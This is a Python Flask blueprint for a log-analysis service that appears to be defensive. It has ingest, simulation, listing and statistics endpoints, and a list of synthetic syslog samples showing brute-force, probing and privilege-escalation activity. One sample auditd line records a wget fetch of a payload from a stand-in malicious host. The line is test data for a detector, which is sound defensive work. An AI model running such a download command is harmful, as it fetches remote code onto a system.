from flask import Blueprint, request, jsonify
from services.analysis_pipeline import analyze_log_line, analyze_batch, get_log_stats
from utils.database import get_collection
import random

logs_bp = Blueprint("logs", __name__)

SAMPLE_LOGS = [
    "Jan 15 10:23:45 server01 sshd[1234]: Failed password for root from 192.168.1.100 port 22 ssh2",
    "Jan 15 10:23:46 server01 sshd[1234]: Failed password for root from 192.168.1.100 port 22 ssh2",
    "Jan 15 10:23:47 server01 sshd[1234]: Failed password for admin from 192.168.1.100 port 22 ssh2",
    "Jan 15 10:23:48 server01 sshd[1234]: Failed password for ubuntu from 192.168.1.100 port 22 ssh2",
    "Jan 15 10:23:49 server01 sshd[1234]: error: maximum authentication attempts exceeded for root from 192.168.1.100",
    "Jan 15 10:24:00 server01 sshd[1235]: Accepted password for deploy from 10.0.0.5 port 4532 ssh2",
    "Jan 15 10:24:01 server01 sshd[1235]: pam_unix(sshd:session): session opened for user deploy",
    "Jan 15 10:25:00 server01 kernel: Possible SYN flooding on port 80. Sending cookies.",
    "Jan 15 10:25:01 server01 kernel: [UFW BLOCK] IN=eth0 SRC=203.0.113.5 DST=192.168.1.1 PROTO=TCP DPT=22",
    "Jan 15 10:26:00 server01 sudo: admin: TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/bin/bash",
    "Jan 15 10:26:30 server01 sshd[1240]: Invalid user hacker from 10.10.10.10",
    "Jan 15 10:26:31 server01 sshd[1240]: Invalid user oracle from 10.10.10.10",
    "Jan 15 10:27:00 server01 apache2[980]: 198.51.100.5 - GET /admin HTTP/1.1 403 289",
    "Jan 15 10:27:01 server01 apache2[980]: 198.51.100.5 - GET /wp-admin HTTP/1.1 404 189",
    "Jan 15 10:27:02 server01 apache2[980]: 198.51.100.5 - GET /.env HTTP/1.1 403 289",
    "Jan 15 10:28:00 server01 auth[999]: pam_unix(su:auth): authentication failure; user=www-data",
    "Jan 15 10:29:00 server01 cron[5678]: (root) CMD (/usr/local/bin/backup.sh)",
    "Jan 15 10:30:00 server01 systemd[1]: Started Daily apt download activities.",
    "Jan 15 10:31:00 server01 sshd[1300]: Received disconnect from 192.168.1.50: disconnected by user",
    "Jan 15 10:32:00 server01 kernel: [UFW ALLOW] IN=eth0 SRC=192.168.1.1 DST=192.168.1.2 PROTO=TCP DPT=443",
    "Jan 15 10:33:00 server01 auditd[2100]: type=EXECVE a0=wget a1=-q a2=http://malicious.example.com/payload",
    "Jan 15 10:34:00 server01 sshd[1400]: Failed password for invalid user pi from 45.33.32.156 port 22 ssh2",
    "Jan 15 10:34:01 server01 sshd[1400]: Failed password for invalid user pi from 45.33.32.156 port 22 ssh2",
    "Jan 15 10:35:00 server01 kernel: iptables: connection tracking table full, dropping packet.",
    "Jan 15 10:36:00 server01 mysqld[3000]: Access denied for user root from 198.51.100.20",
    "Jan 15 10:37:00 server01 sshd[1500]: Accepted publickey for admin from 192.168.1.100 port 22",
    "Jan 15 10:38:00 server01 sudo: bob : TTY=pts/2 ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash",
    "Jan 15 10:39:00 server01 kernel: device eth0 entered promiscuous mode",
    "Jan 15 10:40:00 server01 syslog: imuxsock: Acquired UNIX socket",
    "Jan 15 10:41:00 server01 systemd[1]: Starting Daily Cleanup of Temporary Directories.",
]


@logs_bp.route("/ingest", methods=["POST"])
def ingest_log():
    data = request.get_json()
    if not data or "log" not in data:
        return jsonify({"error": "Missing 'log' field"}), 400
    result = analyze_log_line(data["log"], use_ml=data.get("use_ml", False))
    return jsonify(result), 200


@logs_bp.route("/ingest/batch", methods=["POST"])
def ingest_batch():
    data = request.get_json()
    if not data or "logs" not in data:
        return jsonify({"error": "Missing 'logs' field"}), 400
    lines = data["logs"]
    if not isinstance(lines, list) or len(lines) > 1000:
        return jsonify({"error": "Provide a list of up to 1000 lines"}), 400
    result = analyze_batch(lines, use_ml=data.get("use_ml", False))
    return jsonify(result), 200


@logs_bp.route("/simulate", methods=["POST"])
def simulate():
    data = request.get_json() or {}
    n = min(int(data.get("count", 20)), 50)
    selected = random.choices(SAMPLE_LOGS, k=n)
    result = analyze_batch(selected, use_ml=False)
    return jsonify(result), 200


@logs_bp.route("/", methods=["GET"])
def get_logs():
    try:
        limit = int(request.args.get("limit", 100))
        page = int(request.args.get("page", 1))
        threats_only = request.args.get("threats_only", "false").lower() == "true"
        col = get_collection("logs")
        query = {"threat_detected": True} if threats_only else {}
        skip = (page - 1) * limit
        docs = []
        for doc in col.find(query).sort("analyzed_at", -1).skip(skip).limit(limit):
            doc["_id"] = str(doc["_id"])
            docs.append(doc)
        total = col.count_documents(query)
        return jsonify({
            "logs": docs, "total": total, "page": page,
            "limit": limit, "pages": max(1, (total + limit - 1) // limit),
        }), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@logs_bp.route("/stats", methods=["GET"])
def stats():
    return jsonify(get_log_stats()), 200
